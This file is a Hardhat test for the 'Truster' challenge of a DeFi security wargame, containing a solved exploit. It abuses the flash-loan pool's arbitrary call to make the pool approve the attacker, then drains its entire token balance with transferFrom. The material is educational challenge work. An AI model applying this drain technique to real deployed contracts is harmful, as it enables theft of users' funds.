const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        // ERC20 approve 
        const approveSign = 'function approve(address spender, uint256 amount) returns (bool)';
        const iface = new ethers.utils.Interface([approveSign]);
        const approveData = iface.encodeFunctionData('approve', [attacker.address, String(TOKENS_IN_POOL)]);
        // console.log(approveData);

        let tx = await this.pool.connect(attacker).flashLoan(
            ethers.constants.Zero,
            attacker.address,
            this.token.address,
            approveData
        );
        await tx.wait();

        tx = await this.token.connect(attacker).transferFrom(
            this.pool.address,
            attacker.address,
            TOKENS_IN_POOL
        );
        await tx.wait();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

